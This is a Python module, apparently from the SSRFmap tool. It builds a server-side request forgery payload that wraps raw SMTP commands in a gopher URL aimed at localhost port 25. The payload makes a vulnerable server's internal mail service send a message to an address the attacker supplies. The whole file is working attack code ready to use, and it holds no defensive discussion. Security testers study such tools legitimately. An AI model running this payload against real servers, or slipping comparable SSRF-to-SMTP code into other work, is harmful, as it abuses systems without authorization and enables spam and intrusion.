from core.utils import *
import urllib.parse as urllib
import logging

name          = "smtp"
description   = "Send a mail via SMTP"
author        = "Swissky"
documentation = []

class exploit():
    mailto   = "admin@example.com"
    mailfrom = "ssrfmap@exploit.com"
    subject  = "SSRF - Got it!"
    msg      = "SMTP exploit worked"


    def __init__(self, requester, args):
        self.mailto = input("[MAILTO] Give a mail (e.g: hacker@example.com): ")

        gen_host = gen_ip_list("127.0.0.1", args.level)
        for ip in gen_host:
            port = 25
            commands = [
                'MAIL FROM:' + self.mailfrom,
                'RCPT To:' + self.mailto,
                'DATA',
                'From:' + self.mailfrom,
                'Subject:' + self.subject,
                'Message:' + self.msg,
                '.',
                ''
            ]

            data = "%0A".join(commands)
            data = urllib.quote_plus(data).replace("+","%20")
            data = data.replace("%2F","/")
            data = data.replace("%25","%")
            data = data.replace("%3A",":")
            payload = wrapper_gopher(data, ip , port)
            logging.info("Generated payload : {}".format(payload))


            logging.info("Mail sent, look your inbox !")
            r  = requester.do_request(args.param, payload)